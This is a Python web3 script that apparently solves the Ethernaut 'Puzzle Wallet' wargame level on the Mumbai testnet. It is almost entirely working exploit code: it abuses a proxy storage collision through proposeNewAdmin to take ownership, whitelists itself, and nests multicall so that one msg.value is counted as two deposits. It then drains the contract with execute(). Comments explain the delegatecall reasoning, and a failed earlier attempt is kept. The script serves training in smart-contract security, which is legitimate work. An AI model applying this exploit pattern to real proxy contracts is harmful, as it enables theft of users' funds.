
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_utils import remove_0x_prefix, to_hex, to_checksum_address, to_bytes
import os
import json
from eth_abi import abi
from eth_abi import encode
import numpy as np

'''
Next time, those friends will request an audit before depositing any money on a contract. Congrats!

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract.

Move on to the next level when you're ready!
'''

class PuzzleWallet():
    def __init__(self):
        
        # read sensitive data from file
        curr_path = os.path.dirname(os.path.abspath(__file__)) + '/'
        try:
            with open(curr_path + '../secret.json') as json_file:
                self.secret_json = json.load(json_file)
        except:
            print('secret.json missing')
            exit()

        # init web3
        alchemy_url = "https://polygon-mumbai.g.alchemy.com/v2/" + self.secret_json['alpchemy']['api_key']
        self.w3 = Web3(Web3.HTTPProvider(alchemy_url))
        self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        assert self.w3.is_connected()

        # get implementation address
        impl_contract_address = self.get_upgradeable_proxy_implementation(self.secret_json['24_puzzlewallet_addr'])
        impl_contract_address = self.w3.to_checksum_address(remove_0x_prefix(impl_contract_address)[(32-20)*2:])
        print(f'implementation address = {impl_contract_address}')

        # call proxy contract
        _func = 'owner()'
        _owner = self.call_custom_function(_func)
        print(f'{_func} == {_owner}')
        _func = 'admin()'
        _owner = self.call_custom_function(_func)
        print(f'{_func} == {_owner}')

        # https://solidity-by-example.org/delegatecall/
        # NOTE: 
        #  When PuzzleProxy executes delegatecall to contract PuzzleWallet, PuzzleWallet's code is executed
        #  with contract PuzzleProxy's storage, msg.sender and msg.value!!!
        # PuzzleProxy pendingAdmin's stored at storage 0 where PuzzleWallet's ownder address is at
        # == PuzzleWallet's owner can be changed
        
        # send propose new admin message
        if self.w3.to_checksum_address(remove_0x_prefix(_owner)[(32-20)*2:]) != self.w3.to_checksum_address(self.secret_json['my_addr']):
            assert self.propose_new_admin(), 'Failed to propose new admin'

        encoded_my_addr = remove_0x_prefix(self.secret_json['my_addr']).lower().zfill(64)
        encoded_proxy_addr = remove_0x_prefix(self.secret_json['24_puzzlewallet_addr']).lower().zfill(64)
        
        my_addr_whitelisted = int(self.call_custom_function('whitelisted(address)', encoded_my_addr), 16)
        proxy_addr_whitelisted = int(self.call_custom_function('whitelisted(address)', encoded_proxy_addr), 16)
        print('whitelisted(<my_address>)', my_addr_whitelisted)
        print('whitelisted(<proxy>)', proxy_addr_whitelisted)
        # add to whitelist
        if not my_addr_whitelisted:
            assert self.add_to_whitelist(self.secret_json['my_addr']), 'Failed to whitelist'
        if not proxy_addr_whitelisted:
            assert self.add_to_whitelist(self.secret_json['24_puzzlewallet_addr']), 'Failed to whitelist'

        ## get whitelist from storage
        # map_storage_idx = 2
        # pos = remove_0x_prefix(hex(map_storage_idx)).rjust(64, '0')
        # key = remove_0x_prefix(self.secret_json['my_addr']).rjust(64, '0').lower()
        # storage_key = to_hex(Web3.keccak(hexstr=key + pos))
        # contract_storage_data = self.w3.eth.get_storage_at(self.secret_json['24_puzzlewallet_addr'], storage_key)
        # print(self.w3.to_hex(contract_storage_data))
        
        # balances
        balance_my_addr = self.call_custom_function('balances(address)', encoded_my_addr)
        print('balances(<my_address>)', balance_my_addr)
        print('balances(<proxy>)', self.call_custom_function('balances(address)', encoded_proxy_addr))

        # contract balance
        proxy_contract_balance = self.w3.eth.get_balance(self.secret_json['24_puzzlewallet_addr'])
        print('get_balance(<proxy>)', proxy_contract_balance)
    
        # orchestrated multicall
        balance_my_addr_int = int(balance_my_addr, 16)
        if balance_my_addr_int != proxy_contract_balance:
            # first call direct deposit
            function_signature_deposit = self.w3.keccak(text=f'deposit()').hex()[:10]
            # secont time though multicall
            function_signature_multicall = self.w3.keccak(text=f'multicall(bytes[])').hex()[:10]
            sub_multicall_data = remove_0x_prefix(to_hex(encode(['bytes[]'], [
                [to_bytes(hexstr=function_signature_deposit)]
            ])))

            multicall_sub_data_00 = function_signature_deposit
            multicall_sub_data_01 = function_signature_multicall + sub_multicall_data

            multicall_data = remove_0x_prefix(to_hex(encode(['bytes[]'], [
                [to_bytes(hexstr=multicall_sub_data_00), 
                to_bytes(hexstr=multicall_sub_data_01),]
            ])))
            assert self.call_multicall(multicall_data, proxy_contract_balance), 'hack failed'

        # widthraw
        if balance_my_addr_int:
            function_signature_execute = self.w3.keccak(text=f'execute(address,uint256,bytes)').hex()[:10]
            execute_args = remove_0x_prefix(to_hex(encode(['address', 'uint256', 'bytes'], [
                self.secret_json['my_addr'], 
                balance_my_addr_int, 
                to_bytes(hexstr='0x0')
            ])))
            self.call_custom_encoded(function_signature_execute, execute_args)

        # set max balance as we are now the owner of PuzzleWallet
        #print(self.set_max_balance(self.secret_json['my_addr']))

        '''
        FAILED
        # then call though execute() with byte data "deposit()"
        # we need to call back to the contract, so "to" address should be the contract itself
        function_signature_execute = self.w3.keccak(text=f'execute(address,uint256,bytes)').hex()[:10]

        function_signature_multicall = self.w3.keccak(text=f'multicall(bytes[])').hex()[:10]
        multicall_data = remove_0x_prefix(to_hex(encode(['bytes[]'], [
            [to_bytes(hexstr=function_signature_deposit)]
        ])))
        execute_args = to_hex(encode(['address', 'uint256', 'bytes'], [
            self.secret_json['24_puzzlewallet_addr'], 
            proxy_contract_balance, 
            to_bytes(hexstr=function_signature_deposit)
            #to_bytes(hexstr=function_signature_multicall + remove_0x_prefix(multicall_data))
        ]))
        multicall_sub_data_00 = function_signature_deposit
        multicall_sub_data_01 = function_signature_execute + remove_0x_prefix(execute_args)

        multicall_data = remove_0x_prefix(to_hex(encode(['bytes[]'], [
            [to_bytes(hexstr=multicall_sub_data_00), 
             to_bytes(hexstr=multicall_sub_data_01),]
        ])))
        '''

        '''
         - setMaxBalance(<my_addr>) would take the proxy ownership
           problem: require(address(this).balance == 0, "Contract balance is not 0");
        steps in reverse order
         - execute(<any_addr>, address(this).balance, []) should be called
         ! balances[address(this)] >= address(this).balance
         - deposit(address(this))
            balances[address(this)] += msg.value;
         - balances[msg.sender] == address(this).balance
                 - deposit should be called multiple time to reuse msg.value
            * first call direct
            * via execute() / to.call{ value: value }(data) with data function signature to deposit
        
        '''

    def call_multicall(self, _data, _value):
        encoded_function_signature = self.w3.keccak(text=f'multicall(bytes[])').hex()[:10]
        _txn = self.get_mumbai_polygon_empty_tx()
        _txn.update({
            'to': self.secret_json['24_puzzlewallet_addr'],
            'from': self.secret_json['my_addr'],
            'data': encoded_function_signature + _data,
            'value': _value
        })
        return self.sign_and_send_tx(_txn)

    def call_custom_encoded(self, _encoded_func, _data = ''):
        _txn = self.get_mumbai_polygon_empty_tx()
        _txn.update({
            'to': self.secret_json['24_puzzlewallet_addr'],
            'from': self.secret_json['my_addr'],
            'data': _encoded_func + _data
        })
        return self.sign_and_send_tx(_txn)
    
    def call_custom_function(self, _func, _data = ''):
        # make interaction with proxy contract, calling view-only function
        response = self.w3.eth.call({
            'to': self.secret_json['24_puzzlewallet_addr'],
            'from': self.secret_json['my_addr'],
            'data': self.w3.keccak(text=_func).hex()[:10] + _data
        })
        # Decode the response, if necessary
        return self.w3.to_hex(response)

    def propose_new_admin(self):
        encoded_function_signature = self.w3.keccak(text=f'proposeNewAdmin(address)').hex()[:10]
        encoded_addr = remove_0x_prefix(self.secret_json['my_addr']).lower().zfill(64)
        _txn = self.get_mumbai_polygon_empty_tx()
        _txn.update({
            'to': self.secret_json['24_puzzlewallet_addr'],
            'from': self.secret_json['my_addr'],
            'data': encoded_function_signature + encoded_addr
        })
        return self.sign_and_send_tx(_txn)
    
    def add_to_whitelist(self, _addr):
        encoded_function_signature = self.w3.keccak(text=f'addToWhitelist(address)').hex()[:10]
        encoded_addr = remove_0x_prefix(_addr).lower().zfill(64)
        print(f'addToWhitelist({encoded_addr})')
        _txn = self.get_mumbai_polygon_empty_tx()
        _txn.update({
            'to': self.secret_json['24_puzzlewallet_addr'],
            'from': self.secret_json['my_addr'],
            'data': encoded_function_signature + encoded_addr
        })
        return self.sign_and_send_tx(_txn)
    
    def set_max_balance(self, _max_balance_as_address):
        encoded_function_signature = self.w3.keccak(text=f'setMaxBalance(uint256)').hex()[:10]
        encoded_max_balance = remove_0x_prefix(_max_balance_as_address).lower().zfill(64)
        _txn = self.get_mumbai_polygon_empty_tx()
        _txn.update({
            'to': self.secret_json['24_puzzlewallet_addr'],
            'from': self.secret_json['my_addr'],
            'data': encoded_function_signature + encoded_max_balance
        })
        return self.sign_and_send_tx(_txn)
    
    def sign_and_send_tx(self, _txn):
        # sign the transaction
        signed_tx = self.w3.eth.account.sign_transaction(_txn, self.secret_json['my_addr_private_key'])
        # send transaction
        tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        # get transaction hash
        print(f'tx_hash = {self.w3.to_hex(tx_hash)}')
        # wait for the transaction to be mined and get the transaction receipt
        tx_receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
        if tx_receipt['status']:
            print('tx succeeded')
            return True
        else:
            print('tx failed')
        return False

    def get_upgradeable_proxy_implementation(self,
                                             addr,
                                             _IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'):
        impl_contract = self.w3.to_hex(
            self.w3.eth.get_storage_at(self.w3.to_checksum_address(addr), _IMPLEMENTATION_SLOT))
        return impl_contract

    def get_mumbai_polygon_empty_tx(self):
        return {
            'nonce': self.w3.eth.get_transaction_count(self.secret_json['my_addr']),
            'gas': 3000000,
            'gasPrice': self.w3.to_wei('50', 'gwei'),
            'chainId': 80001    #  mumbai-polygon
        }
    
if __name__ == '__main__':
    va = PuzzleWallet()
